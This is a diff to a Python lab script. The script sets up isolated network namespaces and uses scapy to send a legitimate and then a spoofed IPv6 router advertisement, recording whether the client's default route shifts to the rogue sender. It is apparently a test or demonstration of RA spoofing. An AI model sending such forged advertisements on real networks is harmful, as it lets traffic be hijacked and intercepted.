@@ -7,8 +7,9 @@ import time
 from pathlib import Path
 
 PREFIX = "l6spoof"
-ROLES = {"router": ("rh", "r0"), "client": ("ch", "c0"), "sender": ("sh", "s0")}
-BRIDGE = "l6spoofbr"
+PORT_PREFIX = "sp"
+ROLES = {"router": ("sp-rh", "r0"), "client": ("sp-ch", "c0"), "sender": ("sp-sh", "s0")}
+BRIDGE = "l6spbr"
 
 
 def cmd(*args, check=True, capture=False):
@@ -25,6 +26,8 @@ def cleanup():
     for role in ROLES:
         ip("netns", "del", f"{PREFIX}-{role}", check=False)
     ip("link", "del", BRIDGE, check=False)
+    for host, _ in ROLES.values():
+        ip("link", "del", host, check=False)
 
 
 def main():
@@ -57,18 +60,28 @@ def main():
     ip("-n", f"{PREFIX}-router", "-6", "addr", "add", "fe80::1/64", "dev", "r0", "nodad")
     ip("-n", f"{PREFIX}-sender", "-6", "addr", "add", "fe80::dead:beef/64", "dev", "s0", "nodad")
     ip("netns", "exec", f"{PREFIX}-client", "sysctl", "-qw",
-       "net.ipv6.conf.c0.accept_ra=1", "net.ipv6.conf.c0.autoconf=1")
+       "net.ipv6.conf.c0.accept_ra=2", "net.ipv6.conf.c0.autoconf=1",
+       "net.ipv6.conf.c0.disable_ipv6=0")
     out = Path(a.out); out.mkdir(parents=True, exist_ok=True)
     capture = subprocess.Popen(["tcpdump", "-U", "-i", "ch", "-w",
                                 str(out / "ra-spoof.pcap"), "icmp6"])
     time.sleep(1)
+    for _ in range(30):
+        ll = ip("netns", "exec", f"{PREFIX}-client", "ip", "-6", "addr",
+                "show", "dev", "c0", capture=True).stdout
+        if "fe80::" in ll:
+            break
+        time.sleep(0.2)
+    else:
+        raise SystemExit("Client link-local address did not become ready.")
     legit = sc.Ether(src="02:00:00:00:06:01", dst="33:33:00:00:00:01") / sc.IPv6(
         src="fe80::1", dst="ff02::1", hlim=255) / sc.ICMPv6ND_RA(
         routerlifetime=1800, prf=0) / sc.ICMPv6NDOptPrefixInfo(
         prefix="2001:db8:6::", prefixlen=64, L=1, A=1,
-        validlifetime=3600, preferredlifetime=1800)
-    sc.sendp(legit, iface="rh", verbose=False)
-    time.sleep(2)
+        validlifetime=3600, preferredlifetime=1800) / sc.ICMPv6NDOptSrcLLAddr(lladdr="02:00:00:00:06:01")
+    for _ in range(3):
+        sc.sendp(legit, iface="sp-rh", verbose=False)
+        time.sleep(1)
     baseline = ip("netns", "exec", f"{PREFIX}-client", "ip", "-6", "route",
                   "show", "default", capture=True).stdout
     (out / "baseline-route.txt").write_text(baseline)
@@ -78,8 +91,8 @@ def main():
         src="fe80::dead:beef", dst="ff02::1", hlim=255) / sc.ICMPv6ND_RA(
         routerlifetime=900, prf=1) / sc.ICMPv6NDOptPrefixInfo(
         prefix="2001:db8:6::", prefixlen=64, L=1, A=1,
-        validlifetime=3600, preferredlifetime=1800)
-    sc.sendp(fake, iface="sh", verbose=False)
+        validlifetime=3600, preferredlifetime=1800) / sc.ICMPv6NDOptSrcLLAddr(lladdr="02:aa:bb:cc:dd:ee")
+    sc.sendp(fake, iface="sp-sh", verbose=False)
     time.sleep(3)
     capture.terminate(); capture.wait()
     route = ip("netns", "exec", f"{PREFIX}-client", "ip", "-6", "route",
